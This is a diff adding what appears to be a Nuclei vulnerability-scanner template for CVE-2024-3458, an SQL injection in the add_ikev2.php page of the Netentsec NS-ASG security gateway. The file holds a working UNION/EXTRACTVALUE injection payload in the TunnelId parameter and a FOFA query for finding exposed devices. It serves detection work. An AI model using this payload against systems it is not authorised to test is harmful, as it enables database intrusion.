@@ -1,0 +1,26 @@
+id: cve-2024-3458
+info:
+  name: "网康科技NS-ASG应用安全网关 add_ikev2.php SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2024-3458,sql-injection
+  metadata:
+    fingerprint: ns-asg
+    fofa-query: title="网康-NS-ASG-应用安全网关"
+variables:
+  t1: "{{rand_int(1000, 9999)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/add_ikev2.php?TunnelId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5({{t1}})),0x7e))"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{substr(t2,0,31)}}"
+          - "XPATH syntax error"
